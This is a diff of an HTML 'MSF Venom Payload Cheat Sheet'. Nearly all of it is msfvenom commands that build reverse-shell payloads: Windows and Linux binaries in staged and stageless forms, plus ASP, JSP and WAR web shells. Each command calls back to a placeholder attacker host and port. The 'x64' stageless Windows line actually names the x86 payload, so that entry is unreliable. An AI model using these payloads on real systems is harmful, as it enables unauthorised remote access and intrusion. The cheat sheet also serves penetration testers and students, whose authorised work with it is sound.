@@ -1,31 +1,25 @@
 <html>
 <center>
   <h1> MSF Venom Payload Cheat Sheet </h1>
-
-  <h3>Table of Contents:</h3>
-<h4>  – Non Meterpreter Binaries</h4>
-<h4>– Non Meterpreter Web Payloads</h4>
-<h4>– Meterpreter Binaries</h4>
-<h4>– Meterpreter Web Payloads</h4>
   <body>
 <br>
-<h2>Non-Meterpreter Binaries</h2>
-  <h5>Staged Payloads for Windows</h5>
-<p>x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
-  x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe</p>
+<h1>Non-Meterpreter Binaries</h1>
+  <h3>Staged Payloads for Windows</h3>
+    <p>x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe</p>
+  <p>x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe</p>
 
-  <h5>Stageless Payloads for Windows</h5>
-<p>x86 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
-  x64 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe</p>
+  <h3>Stageless Payloads for Windows</h3>
+    <p>x86 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe</p>
+  <p>x64 	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe</p>
 
-  <h5>Staged Payloads for Linux</h5>
-<p>x86	msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
-  x64 	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf</p>
+  <h3>Staged Payloads for Linux</h3>
+    <p>x86	msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf</p>
+  <p>x64 	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf</p>
 
-Stageless Payloads for Linux
-x86 	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
-x64 	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
-<h2>Non-Meterpreter Web Payloads</h2>
+    <h3>Stageless Payloads for Linux</h3>
+    <p>x86 	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf</p>
+      <p>x64 	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf</p>
+<h2>Non-Meterpreter Web Payloads</h1>
 asp	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 jsp	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
 war	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
